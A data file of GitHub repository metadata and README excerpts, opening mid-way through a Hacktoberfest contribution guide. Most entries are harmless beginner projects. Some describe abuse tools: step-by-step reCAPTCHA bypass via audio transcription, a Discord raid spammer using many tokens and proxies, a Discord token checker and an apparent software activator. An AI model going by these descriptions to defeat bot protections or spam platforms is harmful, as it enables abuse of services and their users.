git push command to push the changes to the current branch of your forked repository: Example: git push --set-upstream origin new-branch 5. Update Local Repository While you are working on a project alongside other contributors, it is important for you to keep your local repository up-to-date with the project as you don’t want to make a pull request for code that will cause conflicts. To keep your local copy of the code base updated, you’ll need to sync changes. We’ll first go over configuring a remote for the fork, then syncing the fork. 6. Configure a Remote for the Fork Next, you’ll have to specify a new remote upstream repository for us to sync with the fork. This will be the original repository that you forked from. You’ll have to do this with the git remote add command. git remote add upstream https://github.com/Kronos-2701/Hacktoberfest.git In this example, upstream is the shortname we have supplied for the remote repository since in terms of Git, “upstream” refers to the repository that you cloned from. If you want to add a remote pointer to the repository of a collaborator, you may want to provide that collaborator’s username or a shortened nickname for the shortname.  Sync the Fork Once you have configured a remote that references the upstream and original repository on GitHub, you are ready to sync your fork of the repository to keep it up-to-date.  To sync your fork, from the directory of your local repository in a terminal window, you’ll have to use the git fetch command to fetch the branches along with their respective commits from the upstream repository. Since you used the shortname “upstream” to refer to the upstream repository, you’ll have to pass that to the command: git fetch upstream Switch to the local master branch of our repository: git checkout master You’ll now have to merge any changes that were made in the original repository’s master branch, that you will access through your local upstream/master branch, with your local master branch: git merge upstream/master 8. Create Pull Request At this point, you are ready to make a pull request to the original repository. You should navigate to your forked repository, and press the “New pull request” button on your left-hand side of the page. Hurray!! You just got closer to complete your hacktoberfest challenge. You can add references to some cool open source projects below:   Zulip - Zulip is 100% open source software, built by a vibrant community of hundreds of developers from all around the world.   FOSSASIA - Developing Open Source Software and Hardware to improve people's lives.   MOZILLA - This technology could fall into the right hands. Mozilla has 30 repositories available. Follow their code on GitHub.   Free code camp - Learn to code for free with millions of other people round the world.   Data Structures And Algorithms Hacktoberfest18 - List of Data Structures and Algorithms   Habitica - App that lets users gamify real-life choices and activity with in-app rewards .   Learn to code for free with millions of other people around the world.   REACT - A declarative, efficient, and flexible JavaScript library for building user interfaces. Plenty resource to learn. (official)   ELECTRON - Build cross-platform desktop apps with JavaScript, HTML, and CSS. Plenty Resource to learn and contribute. (official)   Killed by Google - A tribute and log of beloved products and services killed by Google. This is a fun open source project that encourages contributors for Hacktoberfest!   issuehub.io - A website which helps you find projects/issues based on your required language or issue labels.   Code Triage - Another useful tool for searching issues to fix   Up For Grabs -  List of projects with issues that can be resolved by beginners   First Timers Only - A list of issues that are labelled “first-timers-only”.   Awesome First Timers PR - A list of awesome beginners-friendly projects.   Tensor Flow - TensorFlow is an open-source software library for dataflow programming across a range of tasks. It is a symbolic math library, and is also used for machine learning applications such as neural networks.   Kubernetes - An open source container system for automating deployment , scaling and management of containers application.   DuckDuckGo - DuckDuckGo is a privacy-conscious search engine that doesn't track users. Instant Answers is a feature that provides answers without needing to open up a website..   Polymer - An open-source JavaScript library for creating web components which are then used to build web pages and apps, Polymer is currently being developed by Google developers and contributors on GitHub. Central to a wide range of Google services and websites, including YouTube, Google Earth and Google Sites, Polymer received an update in January (Polymer 2.4) which is paving the way for 3.0 and TypeScript support.   Blender - Blender is the free and open source 3D creation suite. It supports the entirety of the 3D pipeline—modeling, rigging, animation, simulation, rendering, compositing and motion tracking, even video editing and game creation.   sagemath - SageMath is a computer algebra system with features covering many aspects of mathematics, including algebra, combinatorics, graph theory, numerical analysis, number theory, calculus and statistics. It builds on top of many existing open-source packages: NumPy, SciPy, matplotlib, Sympy, Maxima, GAP, FLINT, R and many more.   Material Ocean Material Ocean is a theme for various Applications based on a blueish ocean color scheme   Ruby on Sinatra Starter App A starter project for Ruby On Sinatra web app projects to introduce programmers to Ruby programming. Link to Live Application HERE   Flutter Flutter is Google’s UI toolkit for building beautiful, natively compiled applications for mobile, web, and desktop from a single codebase.   Grab Front End Guide An open source Study guide and introduction to the modern front end stack created by Grab.   LibreOffice LibreOffice is a free and open-source office suite, a project of The Document Foundation. LibreOffice uses the international ISO/IEC standard OpenDocument file format (ODF).   Roulette Canvas Game The Roulette game was to control the animation ball stop number. This project was write and using library PixiJs. This is just for fun.   Uber Open Source Uber open source project info   Web Maker A blazing fast & offline web playground in your browser.   Initial Project   "
417399777;Bob;https://github.com/bradleyjoe007/Bob;Python;2021-10-15T07:03:36Z;0;0;0;Bob A python command line project. Many capabilities and to express python skills. Bob is a python project I, myself am creating in python to express my python skills and to make my first publishable project. Bob will have a range of uses and the commands are listed below:  /cmds - List of all the commands /quit - Quits the program /timer - Lets you set a timer for a set amount of time /version - Lets you see what version you are running /path - Lets you see what path Bob's code is at.  Any code in these files can be used, manipulated to however you desire. Last Updated: 15/10/21 
417344726;demos;https://github.com/palypython/demos;;2021-10-15T02:26:44Z;1;1;0;About Python Demos to help beginners learn python by project-based learning. Beginners should fork these expamples and play around and expermiment with them to learn Python. Demos  chat bot template - a terminal based chatbot client and assitant calculator - a terminal based calculator that includes a beginner and advanced template for evalutating math expressions hangman -  terminal based hangman game for guessing words guess the number and guess the function - a fun terminal-based beginner game where players have to guess the number or guess the function simple calculator - a calculator that supports addition, subtraction, mutliplication, and division better calculator - a better version of the above calculator that parses expressions. print name - a program that askes for your name and then prints it.  
417353114;how-to-scroll-by-in-selenium-python-nsg6yw;https://github.com/tryspidy/how-to-scroll-by-in-selenium-python-nsg6yw;Python;2021-10-15T03:07:51Z;0;0;0;
417329041;ICS3U-Unit5-04-Python-Cylinder;https://github.com/lily-liu-17/ICS3U-Unit5-04-Python-Cylinder;Python;2021-10-15T01:07:36Z;0;0;0;ICS3U-Unit5-04-Python-Cylinder  
417318376;tlsfp-py;https://github.com/imwally/tlsfp-py;Python;2021-10-15T00:09:53Z;0;0;0;
417386125;CodeForces;https://github.com/YugDalwadi/CodeForces;Python;2021-10-15T06:05:59Z;1;1;0;
417356522;ProyDjango;https://github.com/Joselyn21/ProyDjango;;2021-10-15T03:24:51Z;0;0;0;
417349797;tsv_to_json;https://github.com/tora-pan/tsv_to_json;Python;2021-10-15T02:52:08Z;0;0;0;
417328770;app-rpg;https://github.com/Arthurads-rj/app-rpg;;2021-10-15T01:06:10Z;0;0;0;app-rpg Aplicativo com interface gráfica feito com Python 
417410761;hello;https://github.com/MansiK21/hello;;2021-10-15T07:41:44Z;0;0;0;
417390094;Maze;https://github.com/waheeduk/Maze;Python;2021-10-15T06:24:30Z;0;0;0;Maze A script that generates a random maze using python. Also includes a short script to render the maze with pygame. Dependencies The script to generate the algorithm for the maze uses two standard modules: random and sys, and a third: pygame, that is used to help develop games with the python language. Pygame can be installed with pip from your terminal or cmd prompt by typing pip3 install pygame. The pygame module then helps render a visual representation of the generated maze, such as the one below.  License This code is licensed under the MIT License. 
417327616;Discord-Client-API;https://github.com/invalidcode232/Discord-Client-API;Python;2021-10-15T01:00:30Z;0;0;0;Discord-Client-API Object-orientated Discord client API made with Python The functions are not all there yet, however it is very easy to add new functionalities to it yourself. Installation Fork this github repository via git clone https://github.com/invalidcode232/Discord-Client-API.git Usage Usage examples can be found on examples/examples.py file. Suggestions/bugs? Please open an issue or a pull request. 
417354115;Discord_bot;https://github.com/JenpeyChao/Discord_bot;;2021-10-15T03:12:40Z;0;0;0;
417373410;Voice-assistant;https://github.com/riya1916/Voice-assistant;;2021-10-15T04:58:59Z;0;0;0;
417374752;School-management-system;https://github.com/riya1916/School-management-system;;2021-10-15T05:05:54Z;0;0;0;
417364589;packaging_tutorial;https://github.com/sparks-baird/packaging_tutorial;Python;2021-10-15T04:08:09Z;0;0;0;Example Package This is a simple example package following the tutorial in https://packaging.python.org/tutorials/packaging-projects. You can use Github-flavored Markdown to write your content. Creating an Environment with Commands https://conda.io/projects/conda/en/latest/user-guide/tasks/manage-environments.html#creating-an-environment-with-commands conda create -n packaging_tutorial python You can verify that the python executable points to the conda environment via (Windows): where python  C:\Users\sterg\anaconda3\envs\packaging_tutorial\python.exe C:\Users\sterg\AppData\Local\Programs\Python\Python39\python.exe C:\Users\sterg\AppData\Local\Microsoft\WindowsApps\python.exe  Notice the anaconda3 path at the top of the list (i.e. first one to be used). python -m pip install --upgrade build 
417362923;pytrace;https://github.com/tflopezhidalgo/pytrace;;2021-10-15T04:00:08Z;0;0;0;pytrace Classic traceroute CLI command built in Python! 
417335689;VariableCalculator;https://github.com/MisterrLuck/VariableCalculator;Python;2021-10-15T01:41:30Z;0;0;0;"Variable Calculator This is a small calculator program, which allows you to make your own variables. All variable names must only be one letter long, otherwise an error will appear. You can assign a variable by stating its name, an equals sign, and then its value or expression. Eg: a = 10 e= 7+ 3.5 j=4 *6 f = 9 / 3 All of those definitions are allowed because they all have; a one character variable name, an equals sign, and a value or expression. However, num = 8  g = 6 n = &4 a = *+ are all illegal. num = 8 Is illegal because the variable name has more than one character  g = 6 Is illegal because it has a space in front of it. n = &4 Is illegal because the value has to be a number or operater. a = *+ Is illegal because you can't have an operater with numbers before and after. "
417383127;CS50-Public;https://github.com/MohammedAli-11/CS50-Public;HTML;2021-10-15T05:52:16Z;0;0;0;
417319277;WebPractice;https://github.com/lookbackjh/WebPractice;HTML;2021-10-15T00:14:48Z;0;0;0;
417377790;reCaptcha-V3-bypass;https://github.com/WeMakeTech/reCaptcha-V3-bypass;Python;2021-10-15T05:23:28Z;0;0;0;reCaptcha V3 bypass Python scrpit to bypass reCaptcha V3 Disable Protected content  Lets do it, Got to the Setting in Chrome. And write “site settings” in the search bar. Move into the Site settings. And search for the “Protected content”. Move into the protected content and disable it.  Downloading of Libraries pip install selenium pip install beautifulsoup4  Changing parts of the code  change byPassUrl value with the url to the site on which reCaptcha needs to be byassed. Set “delayTime” and “audioToTextDelay” according to your internet speed. Pretty much set values work for all. The rest of the code is not to be altered.  Working of the script  When the script runs, it checks the I’m not a robot field. And a popup is visible(as usual) After that the script selects the audio button at bottom left. After that the script downloads the audio. into the same director with the name of “1.mp3”. it takes few seconds don’t worry. After that new tab is opened in to the browser which goes to the watson speech to text converter and uploads the file. And the audio file is converted into text as you can see. It copies the text and paste it into textfield. And the script then presses the verify button. Here you go… Problem Solved.  License This project is licensed under MIT License. Code of Conduct This project follows this Code of Conduct. 
417358370;Throw-a-rock-in-the-air-and-catch-it;https://github.com/Vippopper/Throw-a-rock-in-the-air-and-catch-it;Python;2021-10-15T03:34:28Z;0;0;0;
417331578;pyofw;https://github.com/worthapenny/pyofw;Python;2021-10-15T01:21:10Z;1;1;0;"pyofw Python package for OpenFlowsWater module from Bentley that mainly contains the stub (*.pyi) files and a few py files to get started. Must Create python.exe.config File Bentley's WaterObjects.NET API contains a mixed mode (managed/unmanaged) assemblies as a result, a python configuration file has to placed where the python.exe is location (in your environment). The contents of the file can be copied from below or use from here.  Note: Filename is important. For ""python.exe"" create ""python.exe.config""  <?xml version=""1.0""?> <configuration>   <startup useLegacyV2RuntimeActivationPolicy=""true"">     <supportedRuntime version=""v4.0"" sku="".NETFramework,Version=v4.0""/>   </startup> </configuration> Installation Run the following to install: pip install pyofw  Note: The package itself will not add any value without the Bentley's OpenFlows application like WaterGEMS, WaterCAD, or WaterOPS. And the package assumes the application is installed at the default location. For WaterGEMS it is C:\Program Files (x86)\Bentley\WaterGEMS\x64.  Usage from pyOpenFlows.setupOpenFlows import SetupOpenFlowsWater  # if logging is desired import logging logging.basicConfig(     level=logging.DEBUG,     # level=logging.INFO,     format=""%(asctime)s.%(msecs)03d %(levelname)s: %(message)s"",     datefmt=""%d %H:%M:%S"", ) log = logging.getLogger(__name__)   # Default setup is for WaterGEMS, setup = SetupOpenFlowsWater() # Above class loads the OpenFlow* assemblies # as well as opens up the session where licensing # information are checked   # # example for WaterCAD, # from SetupOpenFlows import AppType # setup = SetupOpenFlowsWater(AppType.WaterCAD)   # NOTE: # After above setup ONLY, do the OpenFlow.* imports # if not, error is thrown at runtime from OpenFlows.Water.Domain import IWaterModel  # Path of the model file to be opened model_filepath = r""C:\Program Files (x86)\Bentley\WaterGEMS\Samples\Example5.wtg"" model: IWaterModel = setup.open_model(model_filepath)  message = f""Active scenario is: {model.ActiveScenario}"" print(message) log.info(message)   # To close the model and and the session setup.end()  # # To only close the model but not the session # # Option 1: # model.Close()  # # Option 2: # setup.end(close_session=False) Developing pyofw To install pyofw, along with the tools you need to develop and run test, run the following in your [virtual]evn: pip install -e .[dev] "
417347292;My_Bots;https://github.com/PeterWrighten/My_Bots;Python;2021-10-15T02:39:40Z;0;0;0;My Bots  Almost based on This Tutorial Telegram and Twitter Bots implemented by Python MEMO About Python Syntax Because this Lib has not been maintained now, so you have to implement it by virtualenv. I will show you how to do it. #Firstly, install virtualenv package  $ pip3 install virtualenv  $ cd ./#directory you wanna implement  #Build virtualenv  $ virtualenv venv  #Activate it  $ source venv/bin/activate  # Deactivate  $ deactivate  How it works  When you implement virtualenv command, python env would be copied from #sys path to ./dir.  When you source it, the pointer pointed to sys-env python & pip would point to ./dir. 
417415383;PDV;https://github.com/ohmmolina/PDV;Python;2021-10-15T07:57:17Z;0;0;0;
417410540;face_det;https://github.com/James-Wachuka/face_det;Python;2021-10-15T07:40:55Z;0;0;0;
417348536;2048-Game-Project;https://github.com/Crazy2code15/2048-Game-Project;Python;2021-10-15T02:45:39Z;0;0;0;2048-Game-Project 
417409291;DMT;https://github.com/CommanderCortex/DMT;Python;2021-10-15T07:36:25Z;1;1;0;DMT My Programming Language Following this Structure: Python -> Asm -> DMT Designed for simplicity as a low level language with options for memory management. This language will be stack-based. 
417317430;C32-Discord-Bot;https://github.com/countchrisdo/C32-Discord-Bot;Python;2021-10-15T00:05:10Z;1;1;0;     C32 Discord Bot      Discord bot that plays music           Table Of Contents  About the Project Built With Acknowledgements  About The Project Play music using the !play command and a valid youtube link. Built With  Python Discord.py Replit.com  Contributing Contributions are what make the open source community such an amazing place to be learn, inspire, and create. Any contributions you make are greatly appreciated.  If you have suggestions for adding or removing projects, feel free to open an issue to discuss it, or directly create a pull request after you edit the README.md file with necessary changes. Please make sure you check your spelling and grammar. Create individual PR for each suggestion.  Creating A Pull Request  Fork the Project Create your Feature Branch (git checkout -b feature/AmazingFeature) Commit your Changes (git commit -m 'Add some AmazingFeature') Push to the Branch (git push origin feature/AmazingFeature) Open a Pull Request  Acknowledgements  Readme Icon Discord Icon  
417410522;binary-logistic-regression-numpy;https://github.com/wahyutirta/binary-logistic-regression-numpy;Python;2021-10-15T07:40:53Z;0;0;0;binary-logistic-regression-numpy a simple numpy only binary logistic implementation in python 
417325551;pyvenv-fast;https://github.com/ACmyles/pyvenv-fast;Shell;2021-10-15T00:49:22Z;0;0;0;pyvenv-fast A zsh plugin to launch a Python venv.  Designed with dotpyvenv in mind. Features  Launch a Python venv in current directory or mkcd a new directory. Create .pyvenvdir to point to venv directory. Specify Python version. Add venv to .gitignore.  Installation Oh My Zsh git clone https://github.com/ACmyles/pyvenv-fast.git $ZSH_CUSTOM/plugins/pyvenv-fast Add pyvenv-fast to plugins in .zshrc. Usage pv [-g] [-v ...] directory Options    Option Argument Purpose     -g None Append new venv to .gitignore.   -v python 3.x Specify Python version.    Example Usage pv new_project  pv -g .  pv -v python3.7 .  pv -g -v python3.7 new_project 
417356293;reviewCal;https://github.com/gunwoo07/reviewCal;Python;2021-10-15T03:23:29Z;0;0;0;reviewCal 내가 복습해야 하는 날짜를 계산해주는 계산기(feat. Python) 
417365491;sftppy;https://github.com/iNonTz/sftppy;Python;2021-10-15T04:13:06Z;0;0;0;"sftppy Copy file form Windows to Linux system by Python script How to use  Generate Pubkey and private key first Read config in python file  Generate Pubkey and private key  Download puttyGen >> https://www.puttygen.com/ Generate and save public key, private key Open up Linux system Following command  cd ~/.ssh nano authorized_keys Back in the shell type echo ""pasted-public-key-from-windows"" > authorized_keys chmod 600 ~/.ssh/authorized_keys If you need to know pubkey of Ubuntu host use this command >> ssh-keyscan ""hostname""    "
417372125;driver-easy-activator;https://github.com/SSSEAL-C/driver-easy-activator;Python;2021-10-15T04:51:24Z;0;0;0;
417365943;SLT-Link-Shortener;https://github.com/SLT-World/SLT-Link-Shortener;CSS;2021-10-15T04:15:45Z;0;0;0;
417409150;Gesture-Controlled-Mouse-Cursor;https://github.com/vnay07/Gesture-Controlled-Mouse-Cursor;Jupyter Notebook;2021-10-15T07:35:58Z;0;0;0;
417415281;neural_network_classifier;https://github.com/pratyush3124/neural_network_classifier;Python;2021-10-15T07:57:00Z;0;0;0;
417385234;BlogWebSite;https://github.com/ADCa97/BlogWebSite;;2021-10-15T06:01:58Z;0;0;0;BlogWebSite 廖雪峰的Python教程实战 
417344612;KLC-Code-Words;https://github.com/aaronjmaxwell/KLC-Code-Words;Python;2021-10-15T02:26:16Z;0;0;0;"KLC-Code-Words My copy of the KLC Code Words with Python project. Goals of the project The learning objectives are given in the Instructor manual. Crack Passwords from CrackDemPWCLC.getCracking import attack for p in [""Refrigerating"", ""13579"", ""H4CK3R"", ""W3lc0m3!""]:     attack(p)  "
417384420;H8_002;https://github.com/windkrn/H8_002;Jupyter Notebook;2021-10-15T05:58:40Z;0;0;0;
417335484;Matplotlib_data_visualization;https://github.com/artuguen28/Matplotlib_data_visualization;Jupyter Notebook;2021-10-15T01:40:19Z;0;0;0;Matplotlib_data_visualization Repository with basic functions of Matplotlib library on Python. Based on Keith Galli`s video on YouTube. 
417353084;SpotifyScraper;https://github.com/weichen6626/SpotifyScraper;Python;2021-10-15T03:07:44Z;0;0;0;SpotifyScraper A simple Python script to scrape music information from Spotify. 
417326106;qizq-spammer;https://github.com/notqizq/qizq-spammer;Python;2021-10-15T00:52:12Z;0;0;0;qizq-spammer A raid tool to spam with multiple accounts and proxies. MADE FOR EDUCATIONAL PURPOSES ONLY. What does it do? qizq spammer lets you raid on discord. It utilizes HTTP proxies and you need tokens to use the tool. Each token = 1 account. Preview  
417413044;A-Path-Finding-Algo-with-Pygame;https://github.com/vasu-0907/A-Path-Finding-Algo-with-Pygame;Python;2021-10-15T07:49:39Z;0;0;1;A star Path Finding-Algo using-Pygame Designed an A* Path finding Visualizer using Python's Pygame Install The pygame module to Run this program. 
417317085;100-Days-of-Code;https://github.com/XG-xin/100-Days-of-Code;Python;2021-10-15T00:03:09Z;0;0;0;100-Days-of-Code My 100 Dasy of Code challenge with learning Python  Mail_Merge_Project NATO-alphabet blackjack coffee-machine flash-card-project password-manager pomodoro pong-game quiz-game snake_game turtle-crossing birthday-wisher  
417380442;Pyspark-Programmings;https://github.com/sudhakarcse505/Pyspark-Programmings;Jupyter Notebook;2021-10-15T05:38:02Z;0;0;0;
417353690;Marvel-API;https://github.com/lnxdxtf/Marvel-API;Python;2021-10-15T03:10:42Z;0;0;0;Marvel-API Marvel API requests with python and other languages 
417374315;Text_To_Speech;https://github.com/Tanish-Panwar/Text_To_Speech;Python;2021-10-15T05:03:41Z;0;0;0;Text_To_Speech A simple text to speech convertor using python 
417359359;red-py;https://github.com/TFullerene/red-py;;2021-10-15T03:40:01Z;0;0;0;red-py A REDUCE Gentran package for converting RLISP expressions, into Python 
417319471;graphs;https://github.com/stuartamitchell/graphs;Python;2021-10-15T00:15:49Z;0;0;0;graphs A library for graph theory algorithms written in Python. 
417374882;pygame-spacefight;https://github.com/Yin-wolf/pygame-spacefight;Python;2021-10-15T05:06:41Z;0;0;0;pygame-spacefight Space Fight game made by python library (pygame). 
417387476;Calculadora;https://github.com/MiguelTuring34/Calculadora;Python;2021-10-15T06:12:24Z;0;0;0;
417325261;quest-o08;https://github.com/mailacss/quest-o08;Python;2021-10-15T00:47:40Z;1;1;0;
417358851;SQL_weekly_workshop4;https://github.com/rmessina1010/SQL_weekly_workshop4;Python;2021-10-15T03:37:11Z;0;0;0;
417364836;LOL;https://github.com/korrykatti/LOL;Python;2021-10-15T04:09:28Z;2;2;0;LOL To lazy to read your homework ? Get it done with LOL Needs python 3.xis a document reader similar to other text to speech converters but what makes it different is it is really very small in size and secure as it is open source . Its currently tested to work on Linux. Would be nice if you would test it on other OS and tell than on issues. Thanks :D Setup You must have python installed i am not covering it  git clone https://github.com/korrykatti/LOL.git cd LOL open terminal/cmd pip install -r requirements.txt This may take some time python3 lol.py  And Booyah! The app has started How to use  go to the folder of the script Paste/Make your .txt file to be readed to you ( more file type support in testing ) open terminal and python3 lol.py Just give the filename and enjoy listening If you want to change the accent just go to lol.py and in line engine.setProperty('voice', voices[11].id) change 11 to the voice index in your system If you want to slow down or fast the speech go to engine.setProperty('rate', 160) and replace 160 with whatever wpm you want  We now have PDF file support for that just run python3 pdfreader.py NOTE : Reading and speaking the pdf files is dependent on your system specs. For a pentium with 1 gb ram it takes 25 minutes to open a 40 page pdf. also the pdf must be in same folder. Pull request will be accepted if you find a faster method THANKS 
417413248;wikipedia-wordcloud-app;https://github.com/PrakashAnalyst/wikipedia-wordcloud-app;Python;2021-10-15T07:50:23Z;2;2;0;"Wikipedia WordCloud App      Wikipedia WordCloud App generate Wikipedia word cloud art created using python's streamlit, matplotlib, wikipedia and wordcloud packages Installation :- To install all necessary requirement packages for the app 👇 pip install -r requirements.txt  Packages Used :- import string import matplotlib.pyplot as plt import streamlit as st import wikipedia from wordcloud import WordCloud Function To Generate WordCloud :- def get_wordcloud(page_name, max_word, max_font, colormap):     wiki_page = None     try:         wiki_page = wikipedia.page(page_name)      except wikipedia.DisambiguationError as e:         wiki_page = wikipedia.page(e.options[0])     except wikipedia.PageError as e:         st.text(f""Page {page_name} does not match any pages. Try another."")      if wiki_page is None:         return None, None, None      wiki_text = wiki_page.content     wiki_title = wiki_page.title     wiki_url = wiki_page.url      allowed_chars = (string.ascii_letters + string.digits + "" "")     for char in wiki_text:         if (char not in allowed_chars):             wiki_text = wiki_text.replace(char, """")     wiki_text = wiki_text.lower()      wiki_words = "" "".join(wiki_text.split("" "")) + """"      wordcloud = WordCloud(         width=800,         height=800,         colormap=colormap,         max_words=max_word,         max_font_size=max_font,     ).generate(wiki_words)          return (wordcloud, wiki_title, wiki_url) App Interface 👇:-  Output Image 👇:-  "
417393620;Tiny-Numworks-GameEngine;https://github.com/RaphaelGoutmann/Tiny-Numworks-GameEngine;Python;2021-10-15T06:39:37Z;1;1;0;Tiny Game Engine for Numworks 
417374484;ttc-py;https://github.com/timmyjose-study/ttc-py;Python;2021-10-15T05:04:37Z;1;1;0;ttc-py Working through the teenytinycompiler compiler tutorial, in Python. Grammar: See docs/grammar.md. 
417375810;Jigsaw-Puzzle-AI;https://github.com/MaximTerleev/Jigsaw-Puzzle-AI;Python;2021-10-15T05:12:09Z;0;0;0;"Jigsaw-Puzzle-AI Solved in 60 seconds with 300 code lines  Hello, everyone! This is a GitHub repository for Towards-Data-Science publication called ""Jigsaw Puzzle AI from A to Z"". Its goal is to let you walk the route described in the paper by yourself. Here you'll find full code in Python and puzzle scan used in a project. Start fast with direct link to Google Colab notebook inside .py file. Enjoy!) "
417409910;instagram;https://github.com/nancymukuiya14/instagram;Python;2021-10-15T07:38:38Z;0;0;0;INSTAGRAM Developed by:Nancy Kigotho Description  This is a clone of Instagram where people share their images and videos for other users to view. Users can sign up, login, view and post photos, search and follow other users.  User Story  Sign in to the application to start using. Upload a pictures to the application. Search for different users using their usernames. See your profile with all your pictures. Follow other users and see their pictures on my timeline.  Setup and Installation To get the project .......  Cloning the repository: Navigate into the folder and install requirements cd instagram Install and activate Virtualenv Install Dependencies pip install -r requirements.txt SetUp your database User,Password, Host then make migrate python manage.py makemigrations instagram python manage.py migrate python manage.py runserver  Technology used  Python3.7.3 Django2.2.4 PostgreSQL heroku  Known Bugs There are no known bugs currently but pull requests are allowed incase you spot a bug Contact Information. Incase you have any questions or you would want to work with me contact me via:  Twitter:@mukuiyakigotho Email:nancykigotho14@gmail.com  License MIT licence 
417348094;project-portfolio;https://github.com/haneulab/project-portfolio;Python;2021-10-15T02:43:37Z;0;0;0;Haneul Choi Portfolio Directory This is my portfolio directory. I have three sub directories from here.  Python & Data Structure JavaScript & DOM manipulation CSS & Design Patterns  Description Each sub-directory contains different components that will relate to the skills that I believe will be needed as a developer. Please direct yourselves into each of these directories to view my products. Contact I can be contacted directly via the following ways.  Linkedin: here Email: hanchoi@ucdavis.edu Kakaotalk: disciples94  Personal Information Name: Haneul Choi Email: hanchoi@ucdavis.edu Current Location: Davis, California Programming Languages: JavaScript, Python Development Technologies: CSS, TailwindCSS, Vue, Nuxt Version Control: Git, GitHub 
417340640;FYP-U-Net;https://github.com/PinkR1ver/FYP-U-Net;Python;2021-10-15T02:06:07Z;1;1;0;My Final Year Project(FYP) In National University of Singapore(NUS) You need Pytorch(stable 1.9.1)   Both cuda version and cpu version are OK File Structure 📦FYP-U-Net  ┣ 📂data  ┃ ┣ 📂imgs  ┃ ┃ ┣ 📌···.tif  ┃ ┃ ┗ ···  ┃ ┣ 📂masks  ┃ ┃ ┣ 📌···_mask.tif  ┃ ┃ ┗ ···  ┃ ┣ 📂PredictImage   ┃ ┃ ┣ 📌0.tif  ┃ ┃ ┣ 📌1.tif  ┃ ┃ ┗ ···  ┃ ┣ 📂SaveImage  ┃ ┃ ┣ 📌0.tif  ┃ ┃ ┣ 📌1.tif  ┃ ┃ ┗ ···  ┃ ┗ 📂Source  ┃ ┃ ┣ 📂TCGA_CS_4941_19960909  ┃ ┃ ┃ ┣ 📌TCGA_CS_4941_19960909_1.tif  ┃ ┃ ┃ ┣ 📌TCGA_CS_4941_19960909_1_mask.tif   ┃ ┃ ┃ ┣ 📌TCGA_CS_4941_19960909_2.tif  ┃ ┃ ┃ ┣ 📌TCGA_CS_4941_19960909_2_mask.tif   ┃ ┃ ┃ ┗ ···  ┃ ┃ ┣ 📂TCGA_CS_4942_19970222  ┃ ┃ ┗ ···  ┣ 📂params  ┃ ┗ 📜unet.pth  ┣ 📓README,md  ┣ 📄data.py  ┣ 📄net.py  ┣ 📄utils.py  ┗ 📄train.py   'data' dir contains the origin dataset in 'Source' dir. And the dataset can be download in Kaggle (https://www.kaggle.com/c/rsna-miccai-brain-tumor-radiogenomic-classification/). And also you can use different dataset. 'imgs' contains images and 'masks' contains corresponding masks to images. Corresponding masks have a _mask suffix. More inforamtion you can check in kaggle. 'SaveImage' is meant for store train results and 'PredictImage' is meant for store test results. 'params' is meant for store model.  Quick Up Run train.py Change DataSet   Delte all images in data dir and its subdir.   Install dataset from kaggle or anything you like(PS. Corresponding masks must have a _mask suffix) into 'Source' dir   Run data.py python3 data.py  Remember change the path. After this, you will get images and masks in imgs dir and masks dir.   Run train.py python3 train.py  Remember change the path. And you can see the results in 'SaveImage' dir and 'PredictImage' dir.   Results  Pre-trained model https://drive.google.com/file/d/1yyrITv7BQf9kDnP__g6Qa3_wUPD1c_i_/view?usp=sharing 
417411667;real-time-3Dposecapture-Unity3D;https://github.com/xerifg/real-time-3Dposecapture-Unity3D;C#;2021-10-15T07:44:46Z;0;0;0;"Environment  mediapipe  0.8.8 opencv-python  4.1.2.30 pyqt5  5.15.4 python  3.8.8 Unity3D-2020.3 camera: D435 or Webcamera or any RGB camera  Usage   run human pose data capture script python 3DPoseCapture/ActionCapture/ActionRecorder.py **Note:**You must change the funtion saveData(datapose17, num)  path to yours in ActionRecorder.py. The Unity3D will read data from here. def saveData(datapose17, num):     with open(f'/home/xrf/3D Pose Unity Project/Assets/data_Doit/{num}.txt', 'w+') as f:         dataString = ""[[""         ......   open your Unity3D and  click run   "
417371229;Ticket-System;https://github.com/rohantamrakar/Ticket-System;Python;2021-10-15T04:46:18Z;0;0;0;
417413156;Discord-Token-Checker;https://github.com/Scripted1337/Discord-Token-Checker;Python;2021-10-15T07:50:03Z;2;2;0;Discord-Token-Checker Fast, Efficient, Clean  
417365628;CovSAR;https://github.com/rbiessel/CovSAR;;2021-10-15T04:13:52Z;0;0;0;CovSAR Covariance Based InSAR Time Series Extraction from an ISCE stack of SLCs with Python 
417366616;Simple-Solidity;https://github.com/brandonjurado/Simple-Solidity;Python;2021-10-15T04:19:54Z;0;0;0;
417322494;InfoCity;https://github.com/MarcosMaga/InfoCity;Python;2021-10-15T00:32:04Z;0;0;0;InfoCity Um módulo Python com funções que retornam informações de uma cidade, como temperatura, noticias e outros. Necessario  Selenium. (pip install selenium) Google Chrome Chrome Driver  Como usar?  Baixe o repositorio e extraia dentro da pasta do seu projeto. Importe o módulo usando: import infocity. Veja o exemplo para ver a utilização na prática. (example.py)  Funções  infocity.getClimate(city)  Função recebe como parametro o nome de uma cidade e retorna uma descrição de texto do clima atual. Exemplo:  print(infocity.getClimate('São Paulo') <- Retornará uma descrição do clima de São Paulo  infocity.getRain(city)  Função recebe como parametro o nome de uma cidade e retorna, em porcentagem, a probabilidade de chover desta cidade. Exemplo: print(infocity.getRain('Belo Horizonte')) <- Retornará a probabilidade de chover, em porcentagem, em Belzonte  infocity.getHumidity(city)  Função recebe como parametro o nome de uma cidade e retorna, em porcentagem, a umidade do ar desta cidade. Exemplo: print(infocity.getHumidty('Campinas')) <- Retornará a umidade de campinas  infocity.getWind(city)  Função recebe como parametro o nome de uma cidade e retorna, em kilometros por hora, a velocidade do vento desta cidade. Exemplo: print(infocity.getWind('New York')) <- Retornará a velocidade do vento de Nova Iorque  infocity.getTemp(city)  Função recebe como parametro o nome de uma cidade e retorna a temperatura desta cidade (dependendo do seu IP, ele poderá vir em Fahrenheit ou Celsius). Exemplo: print(infocity.getTemp('Brasília')) <- Retornará a temperatura de Brasília  infocity.getfirstnews(city)  Função recebe como parametro o nome de uma cidade e retorna a primeira notícia localizada desta cidade. Exemplo: print(infocity.getfirstnews('Chicago')) <- Retornará a primeira notícia encontrada de Chicago  infocity.getNews(city, num)  Função recebe como parametro o nome de uma cidade e um numero inteiro representanto a quantidade de noticias que se deve retornar. Retorna a quantidade de notícias solicitadas desta cidade. Exemplo: print(infocity.getNews('Salvador, 5')) <- Retornará 5 notícias de Salvador Avisos  Os dados são todos adquiridos pelo Google e Google News via WebScrap. Mantenha seu Google Chrome atualizado, caso não utilize, pode-se alterar o webdriver no código fonte. Mantenha o Selenium atualizado. O exemplo não precisa ser importado para 